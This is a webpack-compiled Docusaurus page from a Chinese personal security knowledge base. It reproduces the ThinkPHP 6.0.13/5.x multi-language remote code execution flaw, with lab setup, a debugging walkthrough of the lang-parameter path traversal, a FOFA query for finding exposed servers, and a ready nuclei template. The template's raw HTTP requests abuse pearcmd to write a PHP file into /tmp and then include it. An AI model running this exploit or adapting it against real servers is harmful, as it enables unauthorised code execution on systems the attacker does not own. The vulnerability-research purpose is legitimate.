"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[3833],{1203:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>p,contentTitle:()=>l,default:()=>r,frontMatter:()=>s,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphpv6.0.13\u591a\u8bed\u8a00Rce","title":"Thinkphpv6.0.13\u591a\u8bed\u8a00Rce","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/03.Thinkphpv6.0.13\u591a\u8bed\u8a00Rce.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphpv6.0.13\u591a\u8bed\u8a00Rce","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphpv6.0.13\u591a\u8bed\u8a00Rce","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/02.\u6f0f\u6d1e\u590d\u73b0/01.Thinkphp/03.Thinkphpv6.0.13\u591a\u8bed\u8a00Rce.md","tags":[],"version":"current","sidebarPosition":3,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/Thinkphp6.0.12\u53cd\u5e8f\u5217\u5316"},"next":{"title":"CVE-2022-38352","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6f0f\u6d1e\u590d\u73b0/Thinkphp/CVE-2022-38352"}}');var h=i(4848),c=i(8453);const s={},l=void 0,p={},a=[{value:"fofa\u6307\u7eb9",id:"fofa\u6307\u7eb9",level:2},{value:"\u6f0f\u6d1e\u63cf\u8ff0",id:"\u6f0f\u6d1e\u63cf\u8ff0",level:2},{value:"\u73af\u5883\u642d\u5efa",id:"\u73af\u5883\u642d\u5efa",level:2},{value:"thinkphp6 \uff0c\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",id:"thinkphp6-\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",level:3},{value:"thinkphp5 \uff0c\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",id:"thinkphp5-\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",level:3},{value:"\u6d4b\u8bd5\u73af\u5883\u642d\u5efa",id:"\u6d4b\u8bd5\u73af\u5883\u642d\u5efa",level:3},{value:"\u8c03\u8bd5",id:"\u8c03\u8bd5",level:2},{value:"POC",id:"poc",level:2},{value:"\u53c2\u8003",id:"\u53c2\u8003",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,c.R)(),...e.components};return(0,h.jsxs)(h.Fragment,{children:[(0,h.jsxs)(n.table,{children:[(0,h.jsx)(n.thead,{children:(0,h.jsxs)(n.tr,{children:[(0,h.jsx)(n.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,h.jsx)(n.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,h.jsx)(n.tbody,{children:(0,h.jsxs)(n.tr,{children:[(0,h.jsx)(n.td,{style:{textAlign:"left"},children:(0,h.jsx)(n.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,h.jsx)(n.td,{style:{textAlign:"left"},children:"2025-10-14 23:58:22"})]})})]}),"\n",(0,h.jsx)(n.p,{children:"Thinkphp\uff0cv6.0.1~v6.0.13\uff0cv5.0.x\uff0cv5.1.x"}),"\n",(0,h.jsx)(n.h2,{id:"fofa\u6307\u7eb9",children:"fofa\u6307\u7eb9"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{children:'header="think_lang"\n'})}),"\n",(0,h.jsx)(n.h2,{id:"\u6f0f\u6d1e\u63cf\u8ff0",children:"\u6f0f\u6d1e\u63cf\u8ff0"}),"\n",(0,h.jsx)(n.p,{children:"\u5982\u679c Thinkphp \u7a0b\u5e8f\u5f00\u542f\u4e86\u591a\u8bed\u8a00\u529f\u80fd\uff0c\u90a3\u5c31\u53ef\u4ee5\u901a\u8fc7 get\u3001header\u3001cookie \u7b49\u4f4d\u7f6e\u4f20\u5165\u53c2\u6570\uff0c\u5b9e\u73b0\u76ee\u5f55\u7a7f\u8d8a+\u6587\u4ef6\u5305\u542b\uff0c\u901a\u8fc7 pearcmd \u6587\u4ef6\u5305\u542b\u8fd9\u4e2a trick \u5373\u53ef\u5b9e\u73b0 RCE\u3002"}),"\n",(0,h.jsx)(n.h2,{id:"\u73af\u5883\u642d\u5efa",children:"\u73af\u5883\u642d\u5efa"}),"\n",(0,h.jsx)(n.h3,{id:"thinkphp6-\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",children:"thinkphp6 \uff0c\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd"}),"\n",(0,h.jsx)(n.p,{children:"app/middleware.php:"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-php",children:"<?php\n// \u5168\u5c40\u4e2d\u95f4\u4ef6\u5b9a\u4e49\u6587\u4ef6\nreturn [\n    // \u5168\u5c40\u8bf7\u6c42\u7f13\u5b58\n    // \\think\\middleware\\CheckRequestCache::class,\n    // \u591a\u8bed\u8a00\u52a0\u8f7d\n    \\think\\middleware\\LoadLangPack::class,\n    // Session\u521d\u59cb\u5316\n    // \\think\\middleware\\SessionInit::class\n];\n"})}),"\n",(0,h.jsx)(n.h3,{id:"thinkphp5-\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd",children:"thinkphp5 \uff0c\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd"}),"\n",(0,h.jsx)(n.p,{children:"config/app.php\napplication/config.php"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-php",children:"'lang_switch_on'         => true\n"})}),"\n",(0,h.jsx)(n.h3,{id:"\u6d4b\u8bd5\u73af\u5883\u642d\u5efa",children:"\u6d4b\u8bd5\u73af\u5883\u642d\u5efa"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-bash",children:"git clone https://github.com/top-think/think.git tp6\ncd tp6\ngit checkout v6.0.12\n"})}),"\n",(0,h.jsxs)(n.p,{children:["\u66f4\u6539 ",(0,h.jsx)(n.code,{children:"composer.json"})," \uff0c\u5b89\u88c5 ",(0,h.jsx)(n.code,{children:"v6.0.12"})," \uff1a"]}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-json",children:'"require": {\n        "php": ">=7.2.5",\n        "topthink/framework": "6.0.12",\n        "topthink/think-orm": "^2.0"\n},\n'})}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-bash",children:"composer install\n"})}),"\n",(0,h.jsx)(n.p,{children:"\u7136\u540e\u6253\u5f00\u591a\u8bed\u8a00\u529f\u80fd\uff1aapp/middleware.php"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-php",children:"\n<?php\n// \u5168\u5c40\u4e2d\u95f4\u4ef6\u5b9a\u4e49\u6587\u4ef6\nreturn [\n    // \u5168\u5c40\u8bf7\u6c42\u7f13\u5b58\n    // \\think\\middleware\\CheckRequestCache::class,\n    // \u591a\u8bed\u8a00\u52a0\u8f7d\n    \\think\\middleware\\LoadLangPack::class,\n    // Session\u521d\u59cb\u5316\n    // \\think\\middleware\\SessionInit::class\n];\n"})}),"\n",(0,h.jsx)(n.p,{children:"\u542f\u52a8docker"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-bash",children:"docker run -itd -p 1080:80 --name tp6 -v $PWD:/var/www/html php:7.4-apache\n"})}),"\n",(0,h.jsx)(n.p,{children:"\u8bbf\u95ee\uff1a"}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.code,{children:"http://192.168.1.128:1080/public/index.php"})}),"\n",(0,h.jsx)(n.h2,{id:"\u8c03\u8bd5",children:"\u8c03\u8bd5"}),"\n",(0,h.jsx)(n.p,{children:"\u8c03\u8bd5\u73af\u5883\uff1awindows \uff0cphp7.4\uff0cthinkphp6.0.13\uff08\u8c03\u8bd5\u73af\u5883\u7528\u7684\u53e6\u4e00\u4e2a\u3001\u4e0d\u5f71\u54cd\u7ed3\u679c\uff09"}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{children:"http://127.0.0.1/index.php?lang=../../../../../public/index\n"})}),"\n",(0,h.jsxs)(n.p,{children:["\u6bcf\u4e2a middleware \u7684 ",(0,h.jsx)(n.code,{children:"handle()"})," \u51fd\u6570\u90fd\u4f1a\u88ab\u8c03\u7528\uff0c\u8fd9\u91cc\u65ad\u5728 ",(0,h.jsx)(n.code,{children:"LoadLangPack.php"})," \u7684 ",(0,h.jsx)(n.code,{children:"handle()"})," \uff0c\u76f4\u63a5\u5728\u6700\u5f00\u5934\u8c03\u7528 ",(0,h.jsx)(n.code,{children:"$langset = $this->detect($request);"})," \uff1a"]}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647104.png",alt:"image-20221221114801906"})}),"\n",(0,h.jsxs)(n.p,{children:["\u8ddf\u8fdb",(0,h.jsx)(n.code,{children:"$this->detect($request)"}),"\uff0c\t\u53d1\u73b0\u662f\u5bf9langSet\u53d6\u503c\uff0c"]}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647105.png",alt:"image-20221221115109654"})}),"\n",(0,h.jsxs)(n.p,{children:["91\u884c\uff0c\u8fd9\u91cc\u505a\u4e86\u4e00\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0d\u96be\u53d1\u73b0\u8fd9\u4e2a",(0,h.jsx)(n.code,{children:"$this->config['allow_lang_list']"})," \u9ed8\u8ba4\u662f\u4e3a\u7a7a\u7684\uff0c\u53ef\u4ee5\u4e0d\u7528\u7ba1\uff0c\u8fd4\u56de\u503c\u5c31\u4e3a\u8fd9\u91cc\u7684",(0,h.jsx)(n.code,{children:"$range"})]}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647106.png",alt:"image-20221221115217996"})}),"\n",(0,h.jsxs)(n.p,{children:["\u56de\u5230handle()\uff0c\u53d1\u73b0\u4f1a\u53ea\u8981\u4e0d\u662f\u4e0e",(0,h.jsx)(n.code,{children:"$this->config['default_lang']"})," \u9ed8\u8ba4\u89e6\u53d1\u4f1a\u8c03\u7528",(0,h.jsx)(n.code,{children:"$this->lang->switchLangSet($langset);"})," \uff0c\u8ddf\u8fdb\u8c03\u8bd5"]}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647107.png",alt:"image-20221221115558778"})}),"\n",(0,h.jsxs)(n.p,{children:["\u5728 135 \u884c\uff0c",(0,h.jsx)(n.code,{children:"$this->load([ $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',])"}),"\uff0c\u5728\u8fd9\u91cc\u5c31\u5b9e\u73b0\u4e86\u6587\u4ef6\u5305\u542b"]}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-php",children:"$this->load([\n            $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',\n        ]);\n"})}),"\n",(0,h.jsxs)(n.p,{children:["\u5728",(0,h.jsx)(n.code,{children:"$this->load([ $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php',])"}),"\u4e2d\uff0c\u9ed8\u8ba4\u4f1a\u8d70\u5230",(0,h.jsx)(n.code,{children:"$this->parse($name)"})]}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647108.png",alt:"image-20221221120750404"})}),"\n",(0,h.jsx)(n.p,{children:"\u5982\u679c\u662fphp\u6587\u4ef6\u76f4\u63a5\u5c31include\u7684\u4e86"}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647109.png",alt:"image-20221221120935057"})}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191647110.png",alt:"image-20221221121001328"})}),"\n",(0,h.jsx)(n.h2,{id:"poc",children:"POC"}),"\n",(0,h.jsx)(n.p,{children:"\u53ef\u4ee5\u5229\u7528pearcmd \u6587\u4ef6\u5305\u542b\u8fd9\u4e2a trick \uff0c\u53ef\u4ee5\u53c2\u8003 p \u725b\u7684\u6587\u7ae0\uff1a"}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.a,{href:"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp",children:"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"})}),"\n",(0,h.jsx)(n.pre,{children:(0,h.jsx)(n.code,{className:"language-yaml",children:"id: thinkphp-language-local-file-include\ninfo:\n  name: thinkphp-\u591a\u8bed\u8a00-\u672c\u5730\u6587\u4ef6\u5305\u542brce\n  author: wjlin0\n  severity: critical\n  description: \u5982\u679c Thinkphp \u7a0b\u5e8f\u5f00\u542f\u4e86\u591a\u8bed\u8a00\u529f\u80fd\uff0c\u90a3\u5c31\u53ef\u4ee5\u901a\u8fc7 get\u3001header\u3001cookie \u7b49\u4f4d\u7f6e\u4f20\u5165\u53c2\u6570\uff0c\u5b9e\u73b0\u76ee\u5f55\u7a7f\u8d8a+\u6587\u4ef6\u5305\u542b\uff0c\u901a\u8fc7 pearcmd \u6587\u4ef6\u5305\u542b\u8fd9\u4e2a trick \u5373\u53ef\u5b9e\u73b0 RCE\u3002\n  metadata:\n    fofa-query: header=\"think_lang\"\n  reference:\n    - https://tttang.com/archive/1865/#toc_thinkphp-6\n    - https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\n  tags: rce,thinkphp,include\nrequests:\n  - raw:\n      - |+\n        GET /index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo();?>+/tmp/admin.php HTTP/1.1\n        Host: {{Hostname}}\n        Cache-Control: max-age=0\n        Upgrade-Insecure-Requests: 1\n        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n        Accept-Encoding: gzip, deflate\n        Accept-Language: zh-CN,zh;q=0.9\n        Connection: close\n\n      - |+\n        GET /index.php?lang=../../../../../../../../tmp/admin HTTP/1.1\n        Host: {{Hostname}}\n        Cache-Control: max-age=0\n        Upgrade-Insecure-Requests: 1\n        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n        Accept-Encoding: gzip, deflate\n        Accept-Language: zh-CN,zh;q=0.9\n        Connection: close\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n           - PHP Version\n      - type: word\n        part: body\n        words:\n           - '#PEAR_Config'\n      - type: status\n        status:\n           - 200\n"})}),"\n",(0,h.jsx)(n.h2,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,h.jsx)(n.p,{children:(0,h.jsx)(n.a,{href:"https://tttang.com/archive/1865/#toc_thinkphp-5",children:"Thinkphp \u591a\u8bed\u8a00 RCE - \u8df3\u8df3\u7cd6"})})]})}function r(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,h.jsx)(n,{...e,children:(0,h.jsx)(d,{...e})}):d(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>s,x:()=>l});var t=i(6540);const h={},c=t.createContext(h);function s(e){const n=t.useContext(c);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(h):e.components||h:s(e.components),t.createElement(c.Provider,{value:n},e.children)}}}]);